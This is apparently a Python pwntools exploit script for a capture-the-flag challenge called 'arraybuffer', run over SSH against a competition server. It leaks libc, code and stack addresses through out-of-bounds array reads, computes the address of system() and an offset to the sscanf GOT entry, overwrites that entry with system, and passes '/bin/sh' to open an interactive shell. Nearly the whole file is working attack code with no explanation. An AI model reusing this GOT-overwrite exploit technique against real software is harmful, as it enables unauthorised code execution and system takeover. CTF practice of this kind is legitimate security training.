from pwn import * 
import time
"""
system = 0xf7573a63+0x2497d
ebp = 0xffdce774-0xac

got_off = (0x08049b78-ebp+0x1c)/4

"""
sys_offset = 0x228ba


#p = process('./arraybuff')


s=ssh(host='enigma2017.hackcenter.com',user='karthik',port=22)
p=s.run('/problems/c17b4f14d46824d140eaca63fafa9b63/arraybuffer')

print p.recvlines(3)

p.sendline('r')

print p.recvuntil(':')

p.sendline('0x8')

s = p.recvlines(2)

leak = s[1].split('>')[1]
leak = int(leak , 16)

system = leak+sys_offset

p.sendline('r')

print p.recvuntil(':')

p.sendline('0x20')

s = p.recvlines(2)

text_leak = s[1].split('>')[1]
text_leak = int(text_leak , 16)

sscanf = text_leak+0x1ac4

p.sendline('r')

print p.recvuntil(':')

p.sendline('0xe')

s = p.recvlines(2)


stack_leak = s[1].split('>')[1]
stack_leak = int(stack_leak , 16)

ebp = stack_leak-0xac

got_off = (sscanf-ebp+0x1c)/4 

print "[+] libc leak   : "+hex(leak)
print "[+] system      : " +hex(system)
print "[+] text leak   : "+hex(text_leak)
print "[+] sscanf@got  : "+hex(sscanf)
print "[+] ebp         : "+hex(ebp)
print "[+] got offset  : "+hex(got_off)


print "calc : "+"p/x ("+hex(sscanf)+"-"+hex(ebp)+"+0x1c"+")/4"

p.sendline('w')

print p.recvline()

p.sendline(raw_input().strip('\n'))

print p.recvline()

p.sendline(hex(system))

print  p.recvlines(2,timeout = 900 )

p.sendline('r')

print p.recvline()

p.sendline('/bin/sh')


p.interactive()












